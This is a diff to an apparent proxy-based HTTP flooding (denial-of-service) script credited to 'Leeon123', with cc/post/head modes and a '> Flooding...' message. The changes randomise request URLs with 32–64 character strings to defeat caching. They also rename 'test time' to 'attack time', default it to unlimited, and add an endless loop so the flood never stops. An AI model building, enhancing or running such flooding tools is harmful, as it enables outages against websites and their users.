@@ -139,7 +139,7 @@ def getuseragent():
 		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def randomurl():
-	return str(Intn(0,271400281257))#less random, more performance
+	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=Intn(32, 64)));
 
 def GenReqHeader(method):
 	global data
@@ -571,7 +571,7 @@ def PrintHelp():
    -f        | set proxies file (default:proxy.txt)
    -b        | enable/disable brute mode
              | Enable=1 Disable=0  (default:0)
-   -s        | set test time(default:60)
+   -s        | set attack time(0 to inf, default:inf)
    -down     | download proxies
    -check    | check proxies
 =====================================================''')
@@ -592,7 +592,7 @@ def main():
 	check_proxies = False
 	download_socks = False
 	proxy_type = 5
-	period = 60
+	period = 0
 	help = False
 	print("> Mode: [cc/post/head]")#slow]")
 	for n,args in enumerate(sys.argv):
@@ -654,9 +654,9 @@ def main():
 	if os.path.exists(out_file)!=True:
 		print("Proxies file not found")
 		return
-	proxies = open(out_file).readlines()	
+	proxies = open(out_file).readlines()
 	check_list(out_file)
-	proxies = open(out_file).readlines()	
+	proxies = open(out_file).readlines()
 	if len(proxies) == 0:
 		print("> There are no more proxies. Please download a new proxies list.")
 		return
@@ -665,7 +665,7 @@ def main():
 		check_socks(3)
 
 	proxies = open(out_file).readlines()
-	
+
 	if help:
 		PrintHelp()
 
@@ -685,7 +685,12 @@ def main():
 	#input("Press Enter to continue.")
 	event.set()
 	print("> Flooding...")
-	time.sleep(period)
+
+	if period > 0:
+		time.sleep(period)
+	else:
+		while True:
+			time.sleep(1)
 
 if __name__ == "__main__":
 	main()#Coded by Leeon123
